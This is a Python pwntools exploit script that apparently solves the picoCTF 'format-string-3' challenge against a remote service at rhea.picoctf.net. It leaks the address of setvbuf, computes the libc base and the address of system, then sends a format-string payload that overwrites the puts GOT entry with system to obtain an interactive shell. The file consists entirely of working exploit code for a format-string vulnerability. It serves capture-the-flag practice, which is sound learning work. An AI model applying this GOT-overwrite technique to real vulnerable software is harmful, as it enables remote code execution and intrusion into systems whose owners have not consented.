#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = "./format-string-3"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")

# Start the process or remote connection
# io = process()
io = remote("rhea.picoctf.net", 50035)

if args.GDB:
    gdb.attach(io, "b *main+127")  # gdb attachment (if needed for debugging)

# The starting offset where the EBP is saved (from the vulnerability)
start = 38

# Leaking the address of setvbuf
io.recvuntil(b'setvbuf in libc: ')
leak = int(io.recvline().strip(), 16)
print(f"Leaked setvbuf @ {hex(leak)}")

# Calculate the base address of libc using the leaked setvbuf address and the offset
libc.address = leak - 0x000000000007a3f0
print(f"Calculated libc base address: {hex(libc.address)}")

# Calculate the address of the system function using the libc base address and the offset of system
system_address = libc.address + 0x000000000004f760
print(f"Calculated system address: {hex(system_address)}")

# Create the payload using the fmtstr_payload to overwrite the GOT entry for puts with the system address
payload = fmtstr_payload(start, {elf.sym.got.puts: system_address})

# Send the payload
io.sendline(payload)

# Get interactive shell (if everything worked correctly)
io.interactive()

